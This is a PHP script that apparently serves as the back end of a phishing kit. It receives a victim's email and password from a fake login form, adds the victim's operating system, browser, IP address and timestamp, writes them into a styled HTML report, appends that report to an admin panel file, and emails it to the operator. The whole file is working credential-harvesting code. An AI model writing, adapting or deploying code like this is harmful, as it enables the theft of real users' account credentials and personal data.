<?php

session_start();

include("system.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$iduserLoginId = $_SESSION['passwordapp'] = $_POST['passwordapp'];
$idpassword = $_SESSION['Emailapp'] = $_POST['Emailapp'];

$msgbank = '
<html><head><title></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
h2 {
display: block;
    font-size: 1em;
    margin-block-start: 0.4em;
    margin-block-end: -0.17em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
    font-weight: bold;
}
@media
only screen and (-webkit-min-device-pixel-ratio: 2),
only screen and (min--moz-device-pixel-ratio: 2),
only screen and (-moz-min-device-pixel-ratio: 2),
only screen and (-o-min-device-pixel-ratio: 2/1),
only screen and (min-device-pixel-ratio: 2),
only screen and (min-resolution: 192dpi),
only screen and (min-resolution: 2dppx) { 
}

span {
    color : #ffffff ;
}
.urotchi {
background-image: url("https://vignette.wikia.nocookie.net/snk/images/d/da/KOFM-Orochi_Fight-5.jpg/revision/latest?cb=20190110190841");
background-position: center center;
background-repeat: no-repeat;
background-attachment: fixed;
    background-size: cover;
}
.styllktnba {

   font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;
    font-size: 20px;
    font-weight: bold;
    color: #ffffff;
}
</style>
</head><body class="urotchi styllktnba" style="background-color: black;color: #ff0081;">
<br>
<div class="container w3-container">
</div>
<br>
<div class="container w3-container">
<div class="w3-panel w3-border w3-light-grey w3-round-large" style="margin: 0 auto;width: 100%;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;max-width: 529px;border: 3px solid #ffffff;border-radius: 57px;">
<div style="margin: 20px;">
<h2 style="font-size: 25px;color: white;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">User Login</h2>
<h2>user Login       : <span> '.$_SESSION["Emailapp"].' </span>  </h2>
<h2>Password Login   : <span>  '.$_SESSION["passwordapp"].' </span> </h2>
<hr><h2>system : <span>  '.$OS.' </span>  </h2><h2>browser : <span> '.$browserTy_Version.' </span> </h2><h2>Ip Adress : <span> '.$_SERVER["REMOTE_ADDR"].' </span> </h2><h2>Date Time : <span> '.$InfoDATE.' </span> </h2>
<br>
</div></div>
</body></html> ';



include("sand_email.php"); 


$f = fopen("../../adminpanel.php", "a");
	fwrite($f, $msgbank);


$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " new login [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: mrazert" . "\r\n";
mail($yourmail, $subject, $msgbank, $headers);



?>